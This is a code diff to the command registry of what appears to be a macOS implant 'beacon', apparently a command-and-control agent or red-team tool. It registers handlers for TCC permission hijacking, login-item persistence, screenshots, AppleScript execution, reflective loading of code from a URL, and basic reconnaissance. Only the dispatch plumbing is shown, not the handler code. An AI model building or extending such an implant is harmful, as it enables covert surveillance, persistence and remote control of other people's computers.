@@ -1,4 +1,15 @@
 #import "ZCommandRegistry.h"
+#import "commands/ZEchoCommandHandler.h"
+#import "commands/ZDialogCommandHandler.h"
+#import "commands/ZWhoAmICommandHandler.h"
+#import "commands/ZTCCJackCommandHandler.h"
+#import "commands/ZLoginItemCommandHandler.h"
+#import "commands/ZTCCCheckCommandHandler.h"
+#import "commands/ZScreenshotCommandHandler.h"
+#import "commands/ZLSCommandHandler.h"
+#import "commands/ZPWDCommandHandler.h"
+#import "commands/ZAppleScriptCommandHandler.h"
+#import "commands/ZReflectiveCommandHandler.h"
 
 @interface ZCommandRegistry ()
 @property (nonatomic, retain) NSMutableDictionary *handlers;
@@ -9,14 +20,14 @@
 @implementation ZCommandRegistry
 
 + (instancetype)sharedRegistry {
-    static ZCommandRegistry *sharedInstance = nil;
+    static ZCommandRegistry *sharedRegistry = nil;
     static dispatch_once_t onceToken;
     
     dispatch_once(&onceToken, ^{
-        sharedInstance = [[ZCommandRegistry alloc] init];
+        sharedRegistry = [[ZCommandRegistry alloc] init];
     });
     
-    return sharedInstance;
+    return sharedRegistry;
 }
 
 - (instancetype)init {
@@ -25,6 +36,19 @@
         self.handlers = [[NSMutableDictionary alloc] init];
         self.activeCommands = [[NSMutableDictionary alloc] init];
         self.commandQueue = dispatch_queue_create("com.zapit.beacon.commands", DISPATCH_QUEUE_CONCURRENT);
+        
+        // Register command handlers
+        [self registerHandler:[[ZEchoCommandHandler alloc] init]];
+        [self registerHandler:[[ZDialogCommandHandler alloc] init]];
+        [self registerHandler:[[ZWhoAmICommandHandler alloc] init]];
+        [self registerHandler:[[ZTCCJackCommandHandler alloc] init]];
+        [self registerHandler:[[ZLoginItemCommandHandler alloc] init]];
+        [self registerHandler:[[ZTCCCheckCommandHandler alloc] init]];
+        [self registerHandler:[[ZScreenshotCommandHandler alloc] init]];
+        [self registerHandler:[[ZLSCommandHandler alloc] init]];
+        [self registerHandler:[[ZPWDCommandHandler alloc] init]];
+        [self registerHandler:[[ZAppleScriptCommandHandler alloc] init]];
+        [self registerHandler:[[ZReflectiveCommandHandler alloc] init]];
     }
     return self;
 }
@@ -36,13 +60,13 @@
     [super dealloc];
 }
 
-- (BOOL)registerCommandHandler:(id<ZCommandHandler>)handler {
+- (BOOL)registerHandler:(id<ZCommandHandler>)handler {
     if (!handler) {
         NSLog(@"Cannot register nil handler");
         return NO;
     }
     
-    NSString *commandType = [handler commandType];
+    NSString *commandType = [handler command];
     if (!commandType || [commandType length] == 0) {
         NSLog(@"Cannot register handler with empty command type");
         return NO;
@@ -90,8 +114,7 @@
         if (completion) {
             NSError *error = [NSError errorWithDomain:@"ZCommandRegistry" 
                                                 code:201 
-                                            userInfo:[NSDictionary dictionaryWithObject:@"Nil command" 
-                                                                                 forKey:NSLocalizedDescriptionKey]];
+                                            userInfo:@{NSLocalizedDescriptionKey: @"Nil command"}];
             completion(NO, nil, error);
         }
         return NO;
@@ -105,11 +128,24 @@
         if (completion) {
             NSError *error = [NSError errorWithDomain:@"ZCommandRegistry" 
                                                 code:202 
-                                            userInfo:[NSDictionary dictionaryWithObject:[NSString stringWithFormat:@"No handler for command type: %@", commandType] 
-                                                                                 forKey:NSLocalizedDescriptionKey]];
+                                            userInfo:@{NSLocalizedDescriptionKey: [NSString stringWithFormat:@"No handler for command type: %@", commandType]}];
             completion(NO, nil, error);
         }
         return NO;
+    }
+    
+    // For command line arguments, construct proper payload if needed
+    if ([commandType isEqualToString:@"reflective"] && command.payload.count == 0) {
+        // If we have command line arguments but no payload, construct it
+        NSArray *args = [[NSProcessInfo processInfo] arguments];
+        if (args.count > 2) {
+            NSString *url = args[2]; // First arg after command type
+            command = [[ZCommandModel alloc] initWithDictionary:@{
+                @"id": command.commandId,
+                @"type": command.type,
+                @"payload": @{@"url": url}
+            }];
+        }
     }
     
     // Check if we can handle multiple commands of this type
@@ -117,7 +153,7 @@
                           [handler supportsMultipleCommands];
     
     // Check if we already have an active command of this type
-    NSString * __unused commandId = [command commandId];
+    NSString *commandId = [command commandId];
     NSMutableArray *activeCommandsOfType = [self.activeCommands objectForKey:commandType];
     
     if (!supportsMultiple && activeCommandsOfType && [activeCommandsOfType count] > 0) {
@@ -125,8 +161,7 @@
         if (completion) {
             NSError *error = [NSError errorWithDomain:@"ZCommandRegistry" 
                                                 code:203 
-                                            userInfo:[NSDictionary dictionaryWithObject:[NSString stringWithFormat:@"Handler for command type '%@' already has an active command", commandType] 
-                                                                                 forKey:NSLocalizedDescriptionKey]];
+                                            userInfo:@{NSLocalizedDescriptionKey: [NSString stringWithFormat:@"Handler for command type '%@' already has an active command", commandType]}];
             completion(NO, nil, error);
         }
         return NO;
